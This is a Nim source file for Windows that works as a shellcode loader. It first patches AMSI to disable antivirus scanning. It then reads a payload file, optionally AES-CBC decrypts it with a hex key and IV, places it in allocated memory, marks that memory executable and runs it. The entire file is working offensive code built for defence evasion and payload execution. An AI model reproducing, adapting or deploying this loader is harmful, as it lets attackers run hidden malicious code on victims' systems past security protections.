import winim
import std/os
import std/strutils
import amsi

proc aesDecrypt(data: var seq[byte], key: openArray[byte], iv: openArray[byte]) =
  var
    hAlg:    BCRYPT_ALG_HANDLE  = nil
    hKey:    BCRYPT_KEY_HANDLE  = nil
    cbResult: ULONG             = 0
    ivCopy = newSeq[byte](iv.len)

  copyMem(addr ivCopy[0], unsafeAddr iv[0], iv.len)

  var r: NTSTATUS

  r = BCryptOpenAlgorithmProvider(addr hAlg, BCRYPT_AES_ALGORITHM, nil, 0)
  echo "[*] BCryptOpenAlgorithmProvider: 0x", r.toHex()

  var cbcMode = BCRYPT_CHAIN_MODE_CBC
  r = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                        cast[PUCHAR](addr cbcMode),
                        ULONG(sizeof(cbcMode)), 0)
  echo "[*] BCryptSetProperty: 0x", r.toHex()

  r = BCryptGenerateSymmetricKey(hAlg, addr hKey, nil, 0,
                                 cast[PUCHAR](unsafeAddr key[0]), ULONG(key.len), 0)
  echo "[*] BCryptGenerateSymmetricKey: 0x", r.toHex()

  r = BCryptDecrypt(hKey,
                    cast[PUCHAR](addr data[0]), ULONG(data.len),
                    nil,
                    cast[PUCHAR](addr ivCopy[0]), ULONG(iv.len),
                    cast[PUCHAR](addr data[0]), ULONG(data.len),
                    addr cbResult, 0)
  echo "[*] BCryptDecrypt: 0x", r.toHex(), " cbResult: ", cbResult

  BCryptDestroyKey(hKey)
  BCryptCloseAlgorithmProvider(hAlg, 0)

  data.setLen(cbResult.int)

proc parseHexBytes(s: string): seq[byte] =
  let clean = s.replace(" ", "").replace(",", "").replace("0x", "")
  result = newSeq[byte](clean.len div 2)
  for i in 0 ..< result.len:
    result[i] = byte(parseHexInt(clean[i*2 .. i*2+1]))

proc main() =
  patchAmsi()

  if paramCount() < 1:
    echo "Usage: ", getAppFilename(), " <shellcode.bin> [key_hex iv_hex]"
    quit(1)

  let filename = paramStr(1)
  let encrypted = paramCount() >= 3
  echo "[*] file: ", filename, " | encrypted: ", encrypted

  var f: File
  if not open(f, filename, fmRead):
    echo "[-] failed to open: ", filename
    quit(1)

  let size = f.getFileSize().int
  var shellcode = newSeq[byte](size)
  discard f.readBuffer(addr shellcode[0], size)
  f.close()
  echo "[*] read ", size, " bytes"

  if encrypted:
    let key = parseHexBytes(paramStr(2))
    let iv  = parseHexBytes(paramStr(3))
    echo "[*] key len: ", key.len, " iv len: ", iv.len
    if key.len != 32 or iv.len != 16:
      echo "[-] bad key/iv length"
      quit(1)
    aesDecrypt(shellcode, key, iv)
    echo "[*] decrypted size: ", shellcode.len

  echo "[*] allocating ", shellcode.len, " bytes"
  let buf = VirtualAlloc(nil,
                         SIZE_T(shellcode.len),
                         MEM_COMMIT or MEM_RESERVE,
                         PAGE_READWRITE)
  if buf == nil:
    echo "[-] VirtualAlloc failed"
    quit(1)
  echo "[*] allocated at 0x", cast[uint](buf).toHex()

  copyMem(buf, addr shellcode[0], shellcode.len)
  echo "[*] shellcode copied"

  var oldProtect: DWORD = 0
  let vpRet = VirtualProtect(buf, SIZE_T(shellcode.len), PAGE_EXECUTE_READ, addr oldProtect)
  echo "[*] VirtualProtect: ", vpRet

  echo "[*] executing..."
  let fn = cast[proc() {.cdecl.}](buf)
  fn()
  echo "[*] returned from shellcode"

main()
